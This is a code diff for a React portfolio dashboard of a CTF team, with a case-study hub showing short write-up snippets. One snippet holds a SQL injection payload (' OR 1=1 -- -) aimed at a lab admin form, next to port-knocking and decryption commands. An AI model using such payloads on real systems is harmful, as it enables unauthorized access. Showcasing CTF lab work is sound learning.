+    lines: [
+      { k: "cmt",  t: "# flag 1 · SQLi nel form /admin" },
+      { k: "plain",t: "' OR 1=1 -- -" },
+      { k: "",     t: "" },
+      { k: "cmt",  t: "# flag 2 · port knocking → ssh aperto" },
+      { k: "fn",   t: "$ knock 10.10.10.9 7000 8000 9000" },
+      { k: "",     t: "" },
+      { k: "cmt",  t: "# flag 3 · decriptaggio AES con chiave trovata in /tmp" },
+      { k: "fn",   t: "$ openssl enc -d -aes-256-cbc -in flag.enc -k …" },
+    ],
+  },
+  "ctf-riccio-pazzo": {
+    kicker: "ctf extra · streamlit · openai · team-built",
+    title: "Il Riccio Pazzo — una CTF che parla",
+    readTime: "~6 min",
+    author: "GC",
+    intro: "Non l'abbiamo risolta, l'abbiamo costruita. Streamlit per la UI, OpenAI API per l'orchestrazione dei puzzle, logica CTF dietro. Bonus fuori brief — perché perché no.",
+    filename: "Riccio2.py",
+    langStrip: "python · streamlit · openai",
+    lines: [
+      { k: "kw",   t: "import streamlit as st" },
+      { k: "kw",   t: "from openai import OpenAI" },
+      { k: "",     t: "" },
+      { k: "plain",t: "st.title('🦔 Il Riccio Pazzo')" },
+      { k: "plain",t: "prompt = st.text_input('Risolvi l\\'enigma:')" },
+      { k: "fn",   t: "client = OpenAI()" },
+      { k: "fn",   t: "resp = client.chat.completions.create(…)" },
+      { k: "plain",t: "if 'FLAG' in resp: st.success('✓ bandiera!')" },
+    ],
+  },
+};
+
+window.WRITEUPS = WRITEUPS;
+
+function CodeBlock({ lines }) {
+  const C = {
+    cmt:   "text-slate-500",
+    kw:    "text-sky-400",
+    fn:    "text-emerald-400",
+    str:   "text-amber-300",
+    op:    "text-slate-400",
+    plain: "text-slate-300",
+  };
+  return (
+    <pre className="overflow-x-auto rounded-md border border-slate-800 bg-slate-950 p-4 font-mono text-[12px] leading-relaxed text-slate-300">
+      {lines.map((l, i) => (
+        <div key={i} className={C[l.k] || C.plain}>{l.t || "\u00A0"}</div>
+      ))}
+    </pre>
+  );
+}
+
+function CaseStudyHub() {
+  const list = PROJECTS.map(p => ({ ...p, writeup: WRITEUPS[p.slug] })).filter(p => p.writeup);
+  const [activeSlug, setActiveSlug] = React.useState(
+    (PROJECTS.find(p => p.featured) || list[0])?.slug
+  );
+  const active = list.find(p => p.slug === activeSlug) || list[0];
+
+  return (
+    <section>
+      <div className="mb-3 flex items-end justify-between">
+        <div>
+          <SectionLabel>Case studies · HUB</SectionLabel>
+          <h2 className="mt-0.5 text-[15px] font-semibold tracking-tight text-slate-100">
+            Choose a write-up
+          </h2>
+        </div>
+        <div className="flex items-center gap-2 font-mono text-[10px] text-slate-500">
+          <Icon name="FileText" size={11} />
+          {list.length} write-ups · internal · rev 03
+        </div>
+      </div>
+
+      <div className="grid grid-cols-12 gap-4">
+        {/* LEFT : picker */}
+        <aside className="col-span-12 lg:col-span-4">
+          <div className="overflow-hidden rounded-lg border border-slate-800 bg-slate-900">
+            <div className="flex items-center justify-between border-b border-slate-800 px-3 py-2">
+              <span className="font-mono text-[10px] uppercase tracking-widest text-slate-500">// archive</span>
+              <span className="font-mono text-[10px] text-slate-600">{list.length} docs</span>
+            </div>
+            <ul className="max-h-[520px] overflow-y-auto">
+              {list.map((p) => {
+                const isActive = p.slug === activeSlug;
+                return (
+                  <li key={p.slug}>
+                    <button
+                      onClick={() => setActiveSlug(p.slug)}
+                      className={`flex w-full items-start gap-3 border-b border-slate-800 px-3 py-2.5 text-left transition-colors last:border-b-0
+                        ${isActive ? "bg-slate-800/70" : "hover:bg-slate-800/40"}`}
+                    >
+                      <span className={`mt-0.5 inline-block h-2 w-2 shrink-0 rounded-full ${isActive ? "bg-emerald-400 da-pulse-dot" : "bg-slate-700"}`} />
+                      <div className="min-w-0 flex-1">
+                        <div className="flex items-center justify-between gap-2">
+                          <span className={`font-mono text-[10px] ${isActive ? "text-emerald-400" : "text-slate-500"}`}>
+                            DOC_ID: {p.id.replace("#","")}-{p.sec.split("_")[2]}
+                          </span>
+                          <ClassifiedStamp level={p.sec} />
+                        </div>
+                        <div className={`mt-1 truncate text-[12px] font-semibold ${isActive ? "text-slate-100" : "text-slate-200"}`}>
+                          {p.writeup.title}
+                        </div>
+                        <div className="mt-0.5 truncate font-mono text-[10px] text-slate-500">
+                          {p.writeup.kicker}
+                        </div>
+                      </div>
+                      {isActive && <Icon name="ArrowRight" size={13} className="mt-1 text-emerald-400" />}
+                    </button>
+                  </li>
+                );
+              })}
+            </ul>
+          </div>
+        </aside>
+
+        {/* RIGHT : active write-up */}
+        <article key={activeSlug} className="da-rise relative col-span-12 overflow-hidden rounded-lg border border-slate-800 bg-slate-900 lg:col-span-8">
+          <div className="pointer-events-none absolute inset-x-0 top-0 h-[1px] bg-gradient-to-r from-transparent via-emerald-500/50 to-transparent" />
+
+          <div className="grid grid-cols-1 gap-0 xl:grid-cols-2">
+            {/* LEFT */}
+            <div className="flex flex-col p-6">
+              <div className="flex items-center gap-2">
+                <span className="inline-flex items-center gap-1.5 rounded-md bg-amber-500/10 px-2 py-0.5 font-mono text-[10px] uppercase tracking-widest text-amber-300 ring-1 ring-amber-500/25">
+                  <Icon name="Star" size={10} /> Case study
+                </span>
+                <ClassifiedStamp level={active.sec} />
+                <span className="font-mono text-[10px] text-slate-500">{active.id}</span>
+              </div>
+
+              <h3 className="mt-3 text-2xl font-semibold tracking-tight text-slate-100">
+                {active.writeup.title}
+              </h3>
+              <p className="mt-1 font-mono text-[11px] text-emerald-400">
+                // {active.writeup.kicker}
+              </p>
+
+              <p className="mt-4 max-w-prose text-[13px] leading-relaxed text-slate-400">
+                {active.writeup.intro}
+              </p>
+
+              <div className="mt-5 flex flex-wrap items-center gap-1.5">
+                {active.tags.map((t) => (
+                  <span key={t} className="rounded border border-slate-800 bg-slate-800/40 px-1.5 py-0.5 font-mono text-[10px] text-slate-300">
+                    {t}
+                  </span>
+                ))}
+              </div>
+
+              <div className="mt-auto flex items-center justify-between border-t border-slate-800 pt-4">
+                <div className="flex items-center gap-2.5">
+                  <Avatar initials={active.writeup.author} size={26} />
+                  <div className="leading-tight">
+                    <div className="text-[12px] text-slate-200">
+                      {MEMBERS.find(m => m.initials === active.writeup.author)?.name || active.writeup.author}
+                    </div>
+                    <div className="font-mono text-[10px] text-slate-500">author · {active.writeup.readTime}</div>
+                  </div>
+                </div>
+
+                <button className="inline-flex items-center gap-1.5 rounded-md bg-emerald-500/10 px-3 py-1.5 font-mono text-[12px] text-emerald-300 ring-1 ring-emerald-500/30 transition-colors hover:bg-emerald-500/15">
+                  Open full file
+                  <Icon name="ArrowRight" size={13} />
+                </button>
+              </div>
+            </div>
+
+            {/* RIGHT */}
+            <div className="border-t border-slate-800 bg-slate-950/60 p-6 xl:border-l xl:border-t-0">
+              <div className="flex items-center justify-between pb-3">
+                <div className="flex items-center gap-2 font-mono text-[10px] text-slate-500">
+                  <span className="inline-flex gap-1">
+                    <span className="inline-block h-2.5 w-2.5 rounded-full bg-red-500/70" />
+                    <span className="inline-block h-2.5 w-2.5 rounded-full bg-amber-400/70" />
+                    <span className="inline-block h-2.5 w-2.5 rounded-full bg-emerald-500/70" />
+                  </span>
+                  {active.writeup.filename}
+                </div>
+                <span className="font-mono text-[10px] text-slate-600">{active.writeup.langStrip}</span>
+              </div>
+              <CodeBlock lines={active.writeup.lines} />
+              <div className="mt-2 flex items-center justify-between font-mono text-[10px] text-slate-500">
+                <span>payload validated {active.date} · 11:42 UTC</span>
+                <span className="inline-flex items-center gap-1 text-emerald-400">
+                  <Icon name="Check" size={11} /> reproducible
+                </span>
+              </div>
+            </div>
+          </div>
+        </article>
+      </div>
+    </section>
+  );
+}
+
+window.CaseStudyHub = CaseStudyHub;
+
+function LinksRow() {
+  return (
+    <div className="flex flex-wrap items-center justify-between gap-3 rounded-lg border border-slate-800 bg-slate-900 px-4 py-3">
+      <div className="flex flex-wrap items-center gap-4">
+        {CONTACTS.filter(c => c.icon !== "Mail").map((c) => (
+          <a
+            key={c.label}
+            href={c.href || "#"}
+            target={c.href && c.href !== "#" ? "_blank" : undefined}
+            rel="noreferrer"
+            className="group inline-flex items-center gap-2 font-mono text-[12px] text-slate-400 transition-colors hover:text-emerald-400"
+          >
+            <Icon name={c.icon} size={13} className="text-slate-500 group-hover:text-emerald-400" />
+            {c.label}
+          </a>
+        ))}
+      </div>
+      <div className="flex items-center gap-2 font-mono text-[10px] uppercase tracking-widest text-slate-600">
+        <Icon name="Lock" size={10} />
+        Confidential · Internal use only
+      </div>
+    </div>
+  );
+}
+
+window.LinksRow = LinksRow;
+
+function DigitalAvengersDashboard() {
+  const [section, setSection] = React.useState("overview");
+
+  return (
+    <div className="flex h-screen w-full overflow-hidden bg-slate-950">
+      <Sidebar active={section} onNavigate={setSection} />
+
+      <div className="flex min-w-0 flex-1 flex-col">
+        <TopBar section={section} onNavigate={setSection} />
+
+        {/* Scrollable main area — pb-56 leaves room for the sticky terminal */}
+        <main className="flex-1 overflow-y-auto px-6 pb-56 pt-5" id="main-scroll">
+          <div className="mx-auto flex max-w-[1400px] flex-col gap-6">
+            <section id="overview" data-screen-label="Overview"><Hero /></section>
+            <section id="metrics"  data-screen-label="Metrics"><MetricsRow /></section>
+            <section id="projects" data-screen-label="Projects"><ProjectsGrid /></section>
+            <section id="roadmap"  data-screen-label="Roadmap"><RoadmapTimeline /></section>
+            <section id="cases"    data-screen-label="Case Studies"><CaseStudyHub /></section>
+            <section id="team"     data-screen-label="Team Links"><LinksRow /></section>
+          </div>
+        </main>
+
+        <Terminal />
+      </div>
+    </div>
+  );
+}
+
+window.DigitalAvengersDashboard = DigitalAvengersDashboard;
+
+const root = ReactDOM.createRoot(document.getElementById("root"));
+root.render(
+  <AuthProvider>
+    <TerminalUIProvider>
+      <DigitalAvengersDashboard />
+    </TerminalUIProvider>
+  </AuthProvider>
+);
+
+</script>
+</body>
+</html>
